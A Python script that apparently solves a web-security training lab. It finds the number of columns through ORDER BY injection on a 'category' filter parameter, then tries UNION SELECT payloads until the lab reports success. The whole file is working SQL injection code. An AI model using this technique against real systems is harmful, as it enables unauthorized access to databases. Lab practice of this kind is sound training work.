import requests
import re
import itertools

url = input('Enter the URL the lab provide: ');
domain = re.search(r'^(https?://[^/]+)', url).group(1)
session = requests.Session()      

try: 
    r = session.get(domain).text
    pattern = r"Make the database retrieve the string: (.*)<"
    target_string = re.search(pattern, r).group(1)

    column_num = 1

    while True:
        column_url = domain + requests.utils.quote("/filter?category=' order by {} --".format(column_num), safe='/:?=')
        r = session.get(column_url)
        if (r.status_code != 200):
            break
        column_num += 1
        
    column_num = column_num - 1
    payload_element = [target_string]

    for _ in range(column_num-1):
        payload_element.append('null')
        
    payload_list = list(set(itertools.permutations(payload_element, column_num)))
    for l in payload_list:
        payload = ','.join(l)
        payload_url = domain + requests.utils.quote("/filter?category=' union select {} --".format(','.join(l)), safe='/:?=')
        r = session.get(payload_url)
        if ('Solved' in r.text):
            print('Payload: ', payload)
            print('Solved')
            break
        else:
            print('Not Solved')
except requests.exceptions.ConnectionError:
    print('Error connecting to the server. Check your URL.')
    